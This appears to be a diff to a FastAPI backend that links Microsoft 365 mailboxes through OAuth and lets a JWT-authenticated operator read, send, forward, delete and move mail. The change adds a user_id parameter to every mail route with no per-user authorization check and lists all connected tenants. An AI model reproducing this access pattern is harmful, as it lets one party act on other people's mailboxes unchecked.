@@ -4,7 +4,7 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 import logging
 
-from auth import generate_login_link, exchange_code_for_token
+from auth import generate_login_link, exchange_code_for_token, get_token
 from graph import (
     fetch_emails,
     get_mail_folders,
@@ -18,9 +18,8 @@ from graph import (
 )
 from admin_auth import login_admin
 from db import init_db, SessionLocal
-from models import Rule
+from models import Rule, TenantToken
 
-# ✅ JWT
 from jose import jwt, JWTError
 from datetime import datetime, timedelta
 
@@ -55,6 +54,12 @@ def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
         )
 
 
+def resolve_user_id(requested_user_id: str | None, user_payload: dict) -> str:
+    # Admin can choose any user_id from dashboard.
+    # If none selected, default to the admin username from JWT.
+    return requested_user_id or user_payload["sub"]
+
+
 # =========================
 # LOGGING
 # =========================
@@ -81,14 +86,14 @@ app.add_middleware(
 # =========================
 @app.middleware("http")
 async def log_requests(request: Request, call_next):
-    logging.debug(f"\n--- REQUEST START ---")
+    logging.debug("\n--- REQUEST START ---")
     logging.debug(f"{request.method} {request.url}")
     logging.debug(f"Headers: {request.headers}")
 
     response = await call_next(request)
 
     logging.debug(f"Response Status: {response.status_code}")
-    logging.debug(f"--- REQUEST END ---\n")
+    logging.debug("--- REQUEST END ---\n")
 
     return response
 
@@ -106,7 +111,7 @@ def startup():
 async def admin_login_route(request: Request):
     try:
         body = await request.json()
-    except:
+    except Exception:
         return JSONResponse({"error": "Invalid JSON"}, status_code=400)
 
     username = body.get("username")
@@ -114,7 +119,6 @@ async def admin_login_route(request: Request):
 
     result = login_admin(username, password)
 
-    # 🔥 SAFE CHECK (fix crash)
     if not result or "error" in result:
         return JSONResponse(result or {"error": "Login failed"}, status_code=401)
 
@@ -126,19 +130,42 @@ async def admin_login_route(request: Request):
     }
 
 # =========================
-# MICROSOFT LOGIN (JWT-BASED)
+# MICROSOFT LOGIN
 # =========================
 @app.get("/login")
-def login(user=Depends(verify_token)):
-    user_id = user["sub"]
+def login(user_id: str, user=Depends(verify_token)):
+    # Keep direct login route for manual use
     return RedirectResponse(generate_login_link(user_id))
 
 
 @app.get("/generate-login-url")
-def generate_login_url(user=Depends(verify_token)):
-    user_id = user["sub"]
+def generate_login_url(user_id: str, user=Depends(verify_token)):
     login_url = generate_login_link(user_id)
-    return {"login_url": login_url}
+    return {"login_url": login_url, "user_id": user_id}
+
+
+@app.get("/microsoft/status")
+def microsoft_status(user_id: str, user=Depends(verify_token)):
+    token_record = get_token(user_id)
+    connected = token_record is not None
+
+    return {
+        "user_id": user_id,
+        "connected": connected,
+        "has_refresh_token": bool(token_record.refresh_token) if token_record else False,
+        "expires_at": token_record.expires_at if token_record else None
+    }
+
+
+@app.get("/users")
+def list_users(user=Depends(verify_token)):
+    db = SessionLocal()
+    try:
+        rows = db.query(TenantToken.tenant_id).distinct().all()
+        user_ids = sorted([row[0] for row in rows if row[0]])
+        return {"users": user_ids}
+    finally:
+        db.close()
 
 
 @app.get("/auth/callback")
@@ -151,14 +178,11 @@ def auth_callback(request: Request):
     if not code:
         return {"error": "No code received"}
 
-    client_ip = request.client.host
+    client_ip = request.client.host if request.client else None
 
     try:
-        # 🔥 state = user_id now
         exchange_code_for_token(code, state, client_ip)
-
-        return RedirectResponse(url="https://www.office.com")
-
+        return RedirectResponse(url="https://frontend-xg84.onrender.com")
     except Exception as e:
         return {"error": str(e)}
 
@@ -166,48 +190,48 @@ def auth_callback(request: Request):
 # EMAILS
 # =========================
 @app.get("/emails")
-def get_emails(user=Depends(verify_token)):
-    user_id = user["sub"]
+def get_emails(user_id: str | None = None, user=Depends(verify_token)):
+    resolved_user_id = resolve_user_id(user_id, user)
 
     try:
         return {
-            "emails": fetch_emails(user_id)
+            "emails": fetch_emails(resolved_user_id)
         }
     except Exception as e:
-    raise HTTPException(status_code=400, detail=str(e))
+        raise HTTPException(status_code=400, detail=str(e))
 
 
 @app.get("/folders")
-def get_folders(user=Depends(verify_token)):
-    user_id = user["sub"]
+def get_folders(user_id: str | None = None, user=Depends(verify_token)):
+    resolved_user_id = resolve_user_id(user_id, user)
 
     try:
         return {
-            "folders": get_mail_folders(user_id)
+            "folders": get_mail_folders(resolved_user_id)
         }
     except Exception as e:
-    raise HTTPException(status_code=400, detail=str(e))
+        raise HTTPException(status_code=400, detail=str(e))
 
 
 @app.get("/email/{message_id}")
-def email_detail(message_id: str, user=Depends(verify_token)):
-    user_id = user["sub"]
+def email_detail(message_id: str, user_id: str | None = None, user=Depends(verify_token)):
+    resolved_user_id = resolve_user_id(user_id, user)
 
     try:
-        return get_email_detail(user_id, message_id)
+        return get_email_detail(resolved_user_id, message_id)
     except Exception as e:
-    raise HTTPException(status_code=400, detail=str(e))
+        raise HTTPException(status_code=400, detail=str(e))
 
 # =========================
 # EMAIL ACTIONS
 # =========================
 @app.post("/email/reply")
 async def reply_email_route(request: Request, user=Depends(verify_token)):
-    user_id = user["sub"]
     body = await request.json()
+    resolved_user_id = resolve_user_id(body.get("user_id"), user)
 
     return reply_to_email(
-        user_id,
+        resolved_user_id,
         body.get("message_id"),
         body.get("reply_text")
     )
@@ -215,11 +239,11 @@ async def reply_email_route(request: Request, user=Depends(verify_token)):
 
 @app.post("/email/send")
 async def send_email_route(request: Request, user=Depends(verify_token)):
-    user_id = user["sub"]
     body = await request.json()
+    resolved_user_id = resolve_user_id(body.get("user_id"), user)
 
     return send_email(
-        user_id,
+        resolved_user_id,
         body.get("to"),
         body.get("subject"),
         body.get("body")
@@ -228,11 +252,11 @@ async def send_email_route(request: Request, user=Depends(verify_token)):
 
 @app.post("/email/forward")
 async def forward_email_route(request: Request, user=Depends(verify_token)):
-    user_id = user["sub"]
     body = await request.json()
+    resolved_user_id = resolve_user_id(body.get("user_id"), user)
 
     return forward_email(
-        user_id,
+        resolved_user_id,
         body.get("message_id"),
         body.get("to")
     )
@@ -240,22 +264,22 @@ async def forward_email_route(request: Request, user=Depends(verify_token)):
 
 @app.post("/email/delete")
 async def delete_email_route(request: Request, user=Depends(verify_token)):
-    user_id = user["sub"]
     body = await request.json()
+    resolved_user_id = resolve_user_id(body.get("user_id"), user)
 
     return delete_email(
-        user_id,
+        resolved_user_id,
         body.get("message_id")
     )
 
 
 @app.post("/email/mark-read")
 async def mark_read_route(request: Request, user=Depends(verify_token)):
-    user_id = user["sub"]
     body = await request.json()
+    resolved_user_id = resolve_user_id(body.get("user_id"), user)
 
     return mark_as_read(
-        user_id,
+        resolved_user_id,
         body.get("message_id"),
         body.get("is_read", True)
     )
@@ -263,11 +287,11 @@ async def mark_read_route(request: Request, user=Depends(verify_token)):
 
 @app.post("/email/move")
 async def move_email_route(request: Request, user=Depends(verify_token)):
-    user_id = user["sub"]
     body = await request.json()
+    resolved_user_id = resolve_user_id(body.get("user_id"), user)
 
     return move_email_to_folder(
-        user_id,
+        resolved_user_id,
         body.get("message_id"),
         body.get("folder_id")
     )
@@ -280,32 +304,37 @@ async def add_rule(request: Request, user=Depends(verify_token)):
     body = await request.json()
     db = SessionLocal()
 
-    rule = Rule(
-        condition=body.get("condition"),
-        action=body.get("action"),
-        target_folder=body.get("target_folder"),
-        forward_to=body.get("forward_to")
-    )
+    try:
+        rule = Rule(
+            condition=body.get("condition"),
+            action=body.get("action"),
+            target_folder=body.get("target_folder"),
+            forward_to=body.get("forward_to")
+        )
 
-    db.add(rule)
-    db.commit()
-    db.close()
+        db.add(rule)
+        db.commit()
 
-    return {"message": "Rule created"}
+        return {"message": "Rule created"}
+    finally:
+        db.close()
 
 
 @app.get("/rules")
 def get_rules(user=Depends(verify_token)):
     db = SessionLocal()
-    rules = db.query(Rule).all()
 
-    result = [{
-        "id": r.id,
-        "condition": r.condition,
-        "action": r.action.value,
-        "target_folder": r.target_folder,
-        "forward_to": r.forward_to
-    } for r in rules]
+    try:
+        rules = db.query(Rule).all()
 
-    db.close()
-    return {"rules": result}
+        result = [{
+            "id": r.id,
+            "condition": r.condition,
+            "action": r.action.value,
+            "target_folder": r.target_folder,
+            "forward_to": r.forward_to
+        } for r in rules]
+
+        return {"rules": result}
+    finally:
+        db.close()
